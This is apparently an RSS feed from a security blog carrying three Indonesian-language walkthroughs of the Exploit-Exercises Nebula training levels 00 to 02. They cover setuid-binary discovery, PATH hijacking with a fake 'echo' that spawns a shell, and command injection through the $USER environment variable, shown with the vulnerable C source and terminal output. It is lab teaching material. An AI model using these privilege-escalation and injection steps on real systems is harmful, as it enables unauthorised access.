<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
      <title>127.0.0.1:4000</title>
   
   <link>127.0.0.1:4000</link>
   <description>CTF, InfoSec, Banana And More..</description>
   <language>en-uk</language>
   <managingEditor> Aiden Pearce</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
	  <title>Exploit-Exercises Nebula - Level02</title>
	  <link>//exploit-exercises-nebula-level02</link>
	  <author>Aiden Pearce</author>
	  <pubDate>2017-01-06T00:00:00+08:00</pubDate>
	  <guid>//exploit-exercises-nebula-level02</guid>
	  <description><![CDATA[
	     <h1 id="executive-summary">Executive Summary</h1>
<p>Challenge level02 exploit-exercise adalah mengganti value Environtment variable $USER sehingga dapat memanipulasi cara kerja program</p>

<h1 id="about">About</h1>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>

<h1 id="source-code">Source code</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="c1">#include &lt;stdlib.h&gt;</span>
<span class="c1">#include &lt;unistd.h&gt;</span>
<span class="c1">#include &lt;string.h&gt;</span>
<span class="c1">#include &lt;sys/types.h&gt;</span>
<span class="c1">#include &lt;stdio.h&gt;</span>

int main<span class="o">(</span>int argc, char **argv, char **envp<span class="o">)</span>
<span class="o">{</span>
  char *buffer<span class="p">;</span>

  gid_t gid<span class="p">;</span>
  uid_t uid<span class="p">;</span>

  <span class="nv">gid</span> <span class="o">=</span> getegid<span class="o">()</span><span class="p">;</span>
  <span class="nv">uid</span> <span class="o">=</span> geteuid<span class="o">()</span><span class="p">;</span>

  setresgid<span class="o">(</span>gid, gid, gid<span class="o">)</span><span class="p">;</span>
  setresuid<span class="o">(</span>uid, uid, uid<span class="o">)</span><span class="p">;</span>

  <span class="nv">buffer</span> <span class="o">=</span> NULL<span class="p">;</span>

  asprintf<span class="o">(</span><span class="p">&amp;</span>buffer, <span class="s2">&quot;/bin/echo %s is cool&quot;</span>, getenv<span class="o">(</span><span class="s2">&quot;USER&quot;</span><span class="o">))</span><span class="p">;</span>
  printf<span class="o">(</span><span class="s2">&quot;about to call system(\&quot;%s\&quot;)\n&quot;</span>, buffer<span class="o">)</span><span class="p">;</span>
  
  system<span class="o">(</span>buffer<span class="o">)</span><span class="p">;</span>
<span class="o">}</span></code></pre></figure>

<h1 id="proof-of-concept">Proof Of Concept</h1>
<p>Pada source code .c diatas terdapat fungsi asprintf untuk melakukan <em>Concatenating strings</em> dengan mengambil value dari $USER yang dipanggil oleh fungsi getenv()</p>

<p>Untuk menyelesaikan challenge ini, kita dapat mengganti value dari $USER sehingga dapat menjalankan command yang kita inginkan.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>sh-4.2$ <span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;AAA;getflag&quot;</span>
sh-4.2$ ./flag02
about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo AAA;getflag is cool&quot;</span><span class="o">)</span>
AAA
You have successfully executed getflag on a target account</code></pre></figure>


	  ]]></description>
	</item>

	<item>
	  <title>Exploit-Exercises Nebula - Level01</title>
	  <link>//exploit-exercises-nebula-level01</link>
	  <author>Aiden Pearce</author>
	  <pubDate>2017-01-06T00:00:00+08:00</pubDate>
	  <guid>//exploit-exercises-nebula-level01</guid>
	  <description><![CDATA[
	     <h1 id="executive-summary">Executive Summary</h1>
<p>Challenge level01 exploit-exercise adalah melakukan modifikasi pada $PATH sehingga dapat melakukan arbitary execution</p>

<h1 id="about">About</h1>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>

<h1 id="source-code">Source code</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="c1">#include &lt;stdlib.h&gt;</span>
<span class="c1">#include &lt;unistd.h&gt;</span>
<span class="c1">#include &lt;string.h&gt;</span>
<span class="c1">#include &lt;sys/types.h&gt;</span>
<span class="c1">#include &lt;stdio.h&gt;</span>

int main<span class="o">(</span>int argc, char **argv, char **envp<span class="o">)</span>
<span class="o">{</span>
  gid_t gid<span class="p">;</span>
  uid_t uid<span class="p">;</span>
  <span class="nv">gid</span> <span class="o">=</span> getegid<span class="o">()</span><span class="p">;</span>
  <span class="nv">uid</span> <span class="o">=</span> geteuid<span class="o">()</span><span class="p">;</span>

  setresgid<span class="o">(</span>gid, gid, gid<span class="o">)</span><span class="p">;</span>
  setresuid<span class="o">(</span>uid, uid, uid<span class="o">)</span><span class="p">;</span>

  system<span class="o">(</span><span class="s2">&quot;/usr/bin/env echo and now what?&quot;</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span></code></pre></figure>

<h1 id="proof-of-concept">Proof Of Concept</h1>

<p>Pada source code .c diatas terdapat bug pada <code>system("/usr/bin/env echo and now what?")</code> yang pada command <code>echo</code> tidak menggunakan PATH lengkapnya, sehingga kita  dapat membuat file baru bernama echo yang berisikan <code>/bin/bash</code> dan memodifikasi $PATH agar file ‘evil echo’ yang kita buat dapat tereksekusi dan mendapatkan shell access sebagai user flag01.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>sh-4.2$ <span class="nb">echo</span> <span class="s2">&quot;/bin/bash&quot;</span> &gt; /tmp/echo
sh-4.2$ chmod +x /tmp/echo
sh-4.2$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;/tmp/&quot;</span>:<span class="nv">$PATH</span>
sh-4.2$ ./flag01
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account</code></pre></figure>


	  ]]></description>
	</item>

	<item>
	  <title>Exploit-Exercises Nebula - Level00</title>
	  <link>//exploit-exercises-level00</link>
	  <author>Aiden Pearce</author>
	  <pubDate>2017-01-06T00:00:00+08:00</pubDate>
	  <guid>//exploit-exercises-level00</guid>
	  <description><![CDATA[
	     <h1 id="executive-summary">Executive Summary</h1>
<p>Challenge level00 exploit-exercise adalah suid program yang akan menjalakan program sebagai user ‘flag00’</p>

<h1 id="about">About</h1>
<p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.
Alternatively, look at the find man page.
To access this level, log in as level00 with the password of level00.</p>

<h1 id="proof-of-concept">Proof Of Concept</h1>
<p>Karena suid program akan dieksekusi sebagai user flag00, saya mengecek user id dari user flag00 pada <code>/etc/passwd</code> agar hasil pencarian lebih spesifik.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>level00@nebula:~$ cat /etc/passwd <span class="p">|</span> grep flag00
flag00:x:999:999::/home/flag00:/bin/sh</code></pre></figure>

<p>Lalu menggunakan command <code>find</code> untuk mencari suid program dari user id 999</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>level00@nebula:~$ find / -perm -4000 -uid <span class="m">999</span> <span class="m">2</span>&gt;/dev/null
/bin/.../flag00
/rofs/bin/.../flag00
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ /rofs/bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ </code></pre></figure>


	  ]]></description>
	</item>


</channel>
</rss>
